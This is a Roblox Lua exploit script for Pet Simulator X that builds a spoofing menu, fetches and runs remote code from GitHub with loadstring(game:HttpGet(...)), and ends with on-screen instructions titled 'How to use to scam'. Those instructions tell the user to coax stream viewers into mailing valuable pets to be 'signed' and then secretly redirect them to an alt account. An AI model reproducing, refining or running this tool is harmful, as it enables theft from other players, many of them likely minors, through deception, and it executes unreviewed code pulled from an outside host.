local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/AAstraX/psx-script/main/libs')))()

getgenv().Username = "YofavKala1"

OrionLib:MakeNotification({

	Name = "PSX Partner & Mail Spoof By AAstraX",	Content = "Good luck, follow the instructions in the UI.",

	Image = "rbxassetid://4483345998",

	Time = 5

})

local Window = OrionLib:MakeWindow({Name = "PSX Partner & Mail Spoof By AAstraX", HidePremium = false, SaveConfig = false, ConfigFolder = "KryptedSaves"})

local PlayerTab = Window:MakeTab({

	Name = "Spoof",

	Icon = "rbxassetid://4483345998",

	PremiumOnly = false

})

local Tab = PlayerTab:AddSection({

	Name = "Player"

})

Tab:AddTextbox({

	Name = "Alt account username",

	Default = "iceninja_Dojo",

	TextDisappear = true,

	Callback = function(Value)

		getgenv().Username = Value

        OrionLib:MakeNotification({

        	Name = "PSX Partner & Mail Spoof By AAstraX",

        	Content = "Set username to "..Value,

        	Image = "rbxassetid://4483345998",

        	Time = 5

        })

	end	  

})

Tab:AddButton({

	Name = "Execute Script",

	Callback = function()

	   if getgenv().Username then

	   OrionLib:MakeNotification({

        	Name = "PSX Partner & Mail Spoof By AAstraX",

        	Content = "Executing..",

        	Image = "rbxassetid://4483345998",

        	Time = 5

        })

        wait(1.75)

        OrionLib:Destroy()

        game:GetService("StarterGui"):SetCore("SendNotification", {

        Title = "Success",

        Text = "Try using your partner hoverboard or signing pets",

        Duration = 5,

        })

	    loadstring(game:HttpGet("https://raw.githubusercontent.com/AAstraX/psx-script/main/Sign-MailSPoof.Lua", true))()

	    else

	   OrionLib:MakeNotification({

        	Name = "PSX Partner & Mail Spoof By AAstraX",

        	Content = "Please select a username",

        	Image = "rbxassetid://4483345998",

        	Time = 5

        })

	   end

  	end    

})

Tab:AddParagraph("","")

Tab:AddParagraph("Instructions",[[

How to use to scam:

- Put the username of the account you want to redirect the huge pets to in the 'Alt account username' section

- Click 'Execute script' (after reading)

- Start streaming

- Get people to send you huges in your mailbox for you to sign

- Sign them (rename them to your username) then send them back in the mailbox

It will look like you sent it back, but actually it redirects to the account you selected ('Alt account username')

Make it convincing, make an alt with a youtube username etc.

If you have any questions, message AAstraX#9939

]])

OrionLib:Init()
